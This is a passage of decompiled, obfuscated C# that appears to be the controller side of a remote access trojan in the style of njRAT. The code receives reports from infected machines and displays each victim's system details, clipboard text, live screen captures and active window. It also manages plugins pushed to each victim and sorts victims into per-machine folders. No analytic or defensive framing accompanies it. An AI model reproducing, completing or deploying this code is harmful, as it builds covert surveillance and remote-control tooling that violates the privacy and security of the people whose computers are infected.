					manager2.FI.Items.Add("my computer name").SubItems.Add(array[2]);
					manager2.FI.Items.Add("Available Physical Memory").SubItems.Add(array[3]);
					manager2.FI.Items.Add("Available Virtual Memory").SubItems.Add(array[4]);
					manager2.FI.Items.Add("OS Full Name").SubItems.Add(array[5]);
					manager2.FI.Items.Add("OS Platform").SubItems.Add(array[6]);
					manager2.FI.Items.Add("PoweredOn").SubItems.Add(array[7]);
					manager2.FI.Items.Add("OS Version").SubItems.Add(array[8]);
					manager2.FI.Items.Add("Total Physical Memory").SubItems.Add(array[9]);
					manager2.FI.Items.Add("Total Virtual Memory").SubItems.Add(array[10]);
					manager2.FI.Items.Add("ClipBoard Text").SubItems.Add(array[11]);
					manager2.FI.Items.Add("Local Date and Time").SubItems.Add(array[12]);
					manager2.FI.Items.Add("Current File Directory").SubItems.Add(array[13]);
					manager2.FI.Items.Add("CapsLock On or Off").SubItems.Add(array[14]);
					manager2.FI.Items.Add("NumLock On or Off").SubItems.Add(array[15]);
					manager2.FI.Items.Add("ScrollLock On or Off").SubItems.Add(array[16]);
					manager2.FI.Items.Add("Mouse Wheel").SubItems.Add(array[17]);
					manager2.FI.Items.Add("Language").SubItems.Add(array[18]);
					manager2.FI.Items.Add("BitsPerPixel").SubItems.Add(array[19]);
					manager2.FI.Items.Add("Ports.GetHashCode").SubItems.Add(array[20]);
				}
				return;
			}
			case "HS":
			{
				Manager manager = (Manager)smethod_7("m" + client.ip());
				if (manager != null)
				{
					manager.HS.Text = "";
					manager.HS.Text = array[1];
				}
				return;
			}
			}
			if (Operators.CompareString(text, "lv", TextCompare: false) != 0 && Operators.CompareString(text, "ll", TextCompare: false) != 0)
			{
				switch (text)
				{
				case "P":
					if (client.L != null && client.L.Cells.Count > int_11)
					{
						lock (((Form1)object_1).S.Online)
						{
							DataGridViewCell dataGridViewCell = client.L.Cells[int_11];
							int num38 = Conversions.ToInteger(array[1]);
							dataGridViewCell.Style.BackColor = ((num38 == 999) ? Color.Orange : ((num38 >= 500) ? Color.GreenYellow : ((num38 < 250) ? Color.LimeGreen : Color.LightGreen)));
							client.L.Cells[int_11].Value = array[1] + "ms";
							client.L.Cells[int_11].Style.SelectionBackColor = Color.Aquamarine;
							client.L.Cells[int_1].Style.BackColor = Color.Orange;
							break;
						}
					}
					break;
				case "pl":
					try
					{
						client.plg.Remove(array[1]);
					}
					catch (Exception ex72)
					{
						ProjectData.SetProjectError(ex72);
						Exception projectError100 = ex72;
						ProjectData.SetProjectError(projectError100);
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
					if (Operators.CompareString(array[2].ToString(), "0", TextCompare: false) == 0)
					{
						client.plg.Add(array[1]);
					}
					else
					{
						smethod_6(client, smethod_5(null, array[1]), Conversions.ToBoolean(array[2]));
					}
					break;
				case "act1":
					if (client.L != null && Operators.CompareString(client.lastAC, array[1], TextCompare: false) != 0)
					{
						client.lastAC = array[1];
						lock (((Form1)object_1).S.Online)
						{
							client.L.Cells[int_12].Value = Class6.smethod_9(array[1]);
							break;
						}
					}
					break;
				case "CAP":
					try
					{
						client.lastPC = DateAndTime.Now;
						client.Isend = false;
						byte[] array77 = (byte[])NewLateBinding.LateIndexGet(Class6.smethod_17(byte_, string_1), new object[1] { 1 }, null);
						if (array77.Length >= 10)
						{
							client.L.Cells[0].Value = Image.FromStream(new MemoryStream(array77));
						}
						break;
					}
					catch (Exception ex71)
					{
						ProjectData.SetProjectError(ex71);
						Exception projectError99 = ex71;
						ProjectData.SetProjectError(projectError99);
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
						break;
					}
				case "~":
					client.Send("~");
					break;
				case "bla":
					client.L.DefaultCellStyle.SelectionBackColor = ((Form1)object_1).L1.DefaultCellStyle.SelectionBackColor;
					break;
				}
				return;
			}
			try
			{
				if (client.L != null)
				{
					((Form1)object_1).L1.method_9(client.L);
				}
				List<object> list10 = new List<object>();
				list10.Add(Resources.JPEG);
				list10.Add(Class6.smethod_9(array[1]));
				list10.Add(Strings.Split(client.ip(), ":")[0]);
				int num39 = array.Length - 2;
				for (int num40 = 2; num40 <= num39; num40++)
				{
					int num41 = num40 + 1;
					if (num41 != int_12 - 1)
					{
						if (num41 != int_7)
						{
							if (num41 != int_4)
							{
								if (num41 == int_6)
								{
									list10.Add(client.COI);
									list10.Add(client.CName);
									continue;
								}
								if (num41 != int_4)
								{
									list10.Add(array[num40]);
									continue;
								}
								string left18 = array[num40];
								if (Operators.CompareString(left18, "False", TextCompare: false) != 0)
								{
									try
									{
										Image yes = Resources.Yes;
										list10.Add(yes);
									}
									catch (Exception ex73)
									{
										ProjectData.SetProjectError(ex73);
										Exception ex74 = ex73;
										ProjectData.SetProjectError(ex74);
										Exception projectError101 = ex74;
										ProjectData.SetProjectError(projectError101);
										ProjectData.ClearProjectError();
										ProjectData.ClearProjectError();
										ProjectData.ClearProjectError();
									}
								}
								else
								{
									try
									{
										Image no = Resources.No;
										list10.Add(no);
									}
									catch (Exception ex75)
									{
										ProjectData.SetProjectError(ex75);
										Exception ex76 = ex75;
										ProjectData.SetProjectError(ex76);
										Exception projectError102 = ex76;
										ProjectData.SetProjectError(projectError102);
										ProjectData.ClearProjectError();
										ProjectData.ClearProjectError();
										ProjectData.ClearProjectError();
									}
								}
								continue;
							}
							string left19 = array[num40];
							if (Operators.CompareString(left19, "False", TextCompare: false) == 0)
							{
								try
								{
									Image no2 = Resources.No;
									list10.Add(no2);
								}
								catch (Exception ex77)
								{
									ProjectData.SetProjectError(ex77);
									Exception ex78 = ex77;
									ProjectData.SetProjectError(ex78);
									Exception projectError103 = ex78;
									ProjectData.SetProjectError(projectError103);
									ProjectData.ClearProjectError();
									ProjectData.ClearProjectError();
									ProjectData.ClearProjectError();
								}
							}
							else
							{
								try
								{
									Image yes2 = Resources.Yes;
									list10.Add(yes2);
								}
								catch (Exception ex79)
								{
									ProjectData.SetProjectError(ex79);
									Exception ex80 = ex79;
									ProjectData.SetProjectError(ex80);
									Exception projectError104 = ex80;
									ProjectData.SetProjectError(projectError104);
									ProjectData.ClearProjectError();
									ProjectData.ClearProjectError();
									ProjectData.ClearProjectError();
								}
							}
							continue;
						}
						switch (array[num40].Substring(0, 5))
						{
						default:
							try
							{
								Image lin = Resources.lin;
								list10.Add(lin);
							}
							catch (Exception ex89)
							{
								ProjectData.SetProjectError(ex89);
								Exception ex90 = ex89;
								ProjectData.SetProjectError(ex90);
								Exception projectError109 = ex90;
								ProjectData.SetProjectError(projectError109);
								ProjectData.ClearProjectError();
								ProjectData.ClearProjectError();
								ProjectData.ClearProjectError();
							}
							break;
						case "Win 7":
							try
							{
								Image x2 = Resources.x;
								list10.Add(x2);
							}
							catch (Exception ex87)
							{
								ProjectData.SetProjectError(ex87);
								Exception ex88 = ex87;
								ProjectData.SetProjectError(ex88);
								Exception projectError108 = ex88;
								ProjectData.SetProjectError(projectError108);
								ProjectData.ClearProjectError();
								ProjectData.ClearProjectError();
								ProjectData.ClearProjectError();
							}
							break;
						case "Win X":
							try
							{
								Image x = Resources.x;
								list10.Add(x);
							}
							catch (Exception ex85)
							{
								ProjectData.SetProjectError(ex85);
								Exception ex86 = ex85;
								ProjectData.SetProjectError(ex86);
								Exception projectError107 = ex86;
								ProjectData.SetProjectError(projectError107);
								ProjectData.ClearProjectError();
								ProjectData.ClearProjectError();
								ProjectData.ClearProjectError();
							}
							break;
						case "Win 8":
							try
							{
								Image _2 = Resources._8;
								list10.Add(_2);
							}
							catch (Exception ex83)
							{
								ProjectData.SetProjectError(ex83);
								Exception ex84 = ex83;
								ProjectData.SetProjectError(ex84);
								Exception projectError106 = ex84;
								ProjectData.SetProjectError(projectError106);
								ProjectData.ClearProjectError();
								ProjectData.ClearProjectError();
								ProjectData.ClearProjectError();
							}
							break;
						case "Win 1":
							try
							{
								Image _ = Resources._8;
								list10.Add(_);
							}
							catch (Exception ex81)
							{
								ProjectData.SetProjectError(ex81);
								Exception ex82 = ex81;
								ProjectData.SetProjectError(ex82);
								Exception projectError105 = ex82;
								ProjectData.SetProjectError(projectError105);
								ProjectData.ClearProjectError();
								ProjectData.ClearProjectError();
								ProjectData.ClearProjectError();
							}
							break;
						}
					}
					else
					{
						client.lastAC = array[num40];
						list10.Add(Class6.smethod_9(array[num40]));
					}
				}
				client.Folder = Conversions.ToString(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(list10[int_2]), "_")), RuntimeHelpers.GetObjectValue(list10[int_3]))), "_")), Strings.Split(Conversions.ToString(RuntimeHelpers.GetObjectValue(list10[int_0])), "_")[Strings.Split(Conversions.ToString(RuntimeHelpers.GetObjectValue(list10[int_0])), "_").Length - 1])));
				string text35 = "\\/<>?*:|\"";
				int num42 = 0;
				for (int length = text35.Length; num42 < length; num42++)
				{
					string text36 = Conversions.ToString(text35[num42]);
					client.Folder = client.Folder.Replace(text36, "%" + Conversion.Hex(Strings.Asc(text36)));
				}
				client.Folder = Application.StartupPath + "\\Client\\" + client.Folder + "\\";
				client.L = ((Form1)object_1).L1.method_8(client.ip(), list10.ToArray());
				client.L.Tag = client;
				list10.Clear();
				client.plg.AddRange(Strings.Split(array[array.Length - 1], ","));
			}
			catch (Exception ex91)
			{
				ProjectData.SetProjectError(ex91);
				Exception projectError110 = ex91;
				ProjectData.SetProjectError(projectError110);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception ex92)
		{
			ProjectData.SetProjectError(ex92);
			Exception projectError111 = ex92;
			ProjectData.SetProjectError(projectError111);
			if ((Operators.CompareString(array[0], "up", TextCompare: false) == 0) | (Operators.CompareString(array[0], "dw", TextCompare: false) == 0))
			{
				try
				{
					client.Send("close" + string_1 + array[1]);
				}
				catch (Exception ex93)
				{
					ProjectData.SetProjectError(ex93);
					Exception projectError112 = ex93;
					ProjectData.SetProjectError(projectError112);
					ProjectData.ClearProjectError();
					ProjectData.ClearProjectError();
				}
				ProjectData.ClearProjectError();
			}
			else
			{
				if (Operators.CompareString(array[0].ToLower(), "cap", TextCompare: false) == 0)
				{
					client.Isend = false;
				}
				ProjectData.ClearProjectError();
			}
			ProjectData.ClearProjectError();
		}
	}

	public static T smethod_10<T>(ref T gparam_0, T gparam_1)
	{
		gparam_0 = gparam_1;
		return gparam_1;
	}
}
